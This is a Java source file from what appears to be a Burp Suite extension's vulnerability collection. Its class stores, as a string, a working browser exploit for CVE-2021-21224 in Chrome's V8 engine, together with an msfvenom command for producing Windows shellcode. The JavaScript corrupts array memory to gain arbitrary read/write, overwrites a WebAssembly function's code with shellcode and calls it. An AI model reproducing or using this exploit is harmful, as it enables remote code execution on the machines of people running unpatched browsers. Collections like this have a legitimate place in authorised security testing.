package burp.vuls;

import burp.BurpExtender;
import burp.util.HttpRequestThread;
import burp.util.HttpResult;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;

public class Chrome {

    public static String CVE_2021_21224_poc = "##Condition##\n" +
            "Chrome version < 89.0.4389.114\n" +
            "\n" +
            "##shellcode\n" +
            "msfvenom -a x64 -p windows/x64/exec CMD=\"msg.exe 1 By EDI\" EXITFUNC=thread -f numn" +
            "\n" +
            "##poc(https://github.com/r4j0x00/exploits/tree/master/chrome-0day)\n" +
            "<script>\n" +
            "    function gc() {\n" +
            "        for (var i = 0; i < 0x80000; ++i) {\n" +
            "            var a = new ArrayBuffer();\n" +
            "        }\n" +
            "    }\n" +
            "    let shellcode = [shellcode 区域];\n" +
            "    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);\n" +
            "    var wasmModule = new WebAssembly.Module(wasmCode);\n" +
            "    var wasmInstance = new WebAssembly.Instance(wasmModule);\n" +
            "    var main = wasmInstance.exports.main;\n" +
            "    var bf = new ArrayBuffer(8);\n" +
            "    var bfView = new DataView(bf);\n" +
            "    function fLow(f) {\n" +
            "        bfView.setFloat64(0, f, true);\n" +
            "        return (bfView.getUint32(0, true));\n" +
            "    }\n" +
            "    function fHi(f) {\n" +
            "        bfView.setFloat64(0, f, true);\n" +
            "        return (bfView.getUint32(4, true))\n" +
            "    }\n" +
            "    function i2f(low, hi) {\n" +
            "        bfView.setUint32(0, low, true);\n" +
            "        bfView.setUint32(4, hi, true);\n" +
            "        return bfView.getFloat64(0, true);\n" +
            "    }\n" +
            "    function f2big(f) {\n" +
            "        bfView.setFloat64(0, f, true);\n" +
            "        return bfView.getBigUint64(0, true);\n" +
            "    }\n" +
            "    function big2f(b) {\n" +
            "        bfView.setBigUint64(0, b, true);\n" +
            "        return bfView.getFloat64(0, true);\n" +
            "    }\n" +
            "    class LeakArrayBuffer extends ArrayBuffer {\n" +
            "        constructor(size) {\n" +
            "            super(size);\n" +
            "            this.slot = 0xb33f;\n" +
            "        }\n" +
            "    }\n" +
            "    function foo(a) {\n" +
            "        let x = -1;\n" +
            "        if (a) x = 0xFFFFFFFF;\n" +
            "        var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));\n" +
            "        arr.shift();\n" +
            "        let local_arr = Array(2);\n" +
            "        local_arr[0] = 5.1;//4014666666666666\n" +
            "        let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8\n" +
            "        arr[0] = 0x1122;\n" +
            "        return [arr, local_arr, buff];\n" +
            "    }\n" +
            "    for (var i = 0; i < 0x10000; ++i)\n" +
            "        foo(false);\n" +
            "    gc(); gc();\n" +
            "    [corrput_arr, rwarr, corrupt_buff] = foo(true);\n" +
            "    corrput_arr[12] = 0x22444;\n" +
            "    delete corrput_arr;\n" +
            "    function setbackingStore(hi, low) {\n" +
            "        rwarr[4] = i2f(fLow(rwarr[4]), hi);\n" +
            "        rwarr[5] = i2f(low, fHi(rwarr[5]));\n" +
            "    }\n" +
            "    function leakObjLow(o) {\n" +
            "        corrupt_buff.slot = o;\n" +
            "        return (fLow(rwarr[9]) - 1);\n" +
            "    }\n" +
            "    let corrupt_view = new DataView(corrupt_buff);\n" +
            "    let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);\n" +
            "    let idx0Addr = corrupt_buffer_ptr_low - 0x10;\n" +
            "    let baseAddr = (corrupt_buffer_ptr_low & 0xffff0000) - ((corrupt_buffer_ptr_low & 0xffff0000) % 0x40000) + 0x40000;\n" +
            "    let delta = baseAddr + 0x1c - idx0Addr;\n" +
            "    if ((delta % 8) == 0) {\n" +
            "        let baseIdx = delta / 8;\n" +
            "        this.base = fLow(rwarr[baseIdx]);\n" +
            "    } else {\n" +
            "        let baseIdx = ((delta - (delta % 8)) / 8);\n" +
            "        this.base = fHi(rwarr[baseIdx]);\n" +
            "    }\n" +
            "    let wasmInsAddr = leakObjLow(wasmInstance);\n" +
            "    setbackingStore(wasmInsAddr, this.base);\n" +
            "    let code_entry = corrupt_view.getFloat64(13 * 8, true);\n" +
            "    setbackingStore(fLow(code_entry), fHi(code_entry));\n" +
            "    for (let i = 0; i < shellcode.length; i++) {\n" +
            "        corrupt_view.setUint8(i, shellcode[i]);\n" +
            "    }\n" +
            "    main();\n</script>";


    public static void CVE_2021_21224() {

    }
}
